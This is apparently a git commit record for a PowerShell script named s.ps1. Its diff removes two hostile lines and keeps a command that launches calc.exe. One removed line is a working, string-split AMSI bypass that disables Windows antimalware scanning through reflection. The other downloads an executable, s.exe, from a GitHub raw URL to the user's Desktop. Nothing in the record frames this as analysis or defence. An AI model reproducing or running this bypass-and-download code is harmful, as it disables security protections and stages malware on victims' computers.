6cc1115a7a175a9f5b0f4e23bf91ce48d75cde21
guilegel4 <guilegel4@mail.com>
2025-02-06 16:09:31 +0100

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,4 +1,1 @@
 Start-Process "calc.exe"
-[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.exe" -OutFile "$env:USERPROFILE\Desktop\s.exe"
-
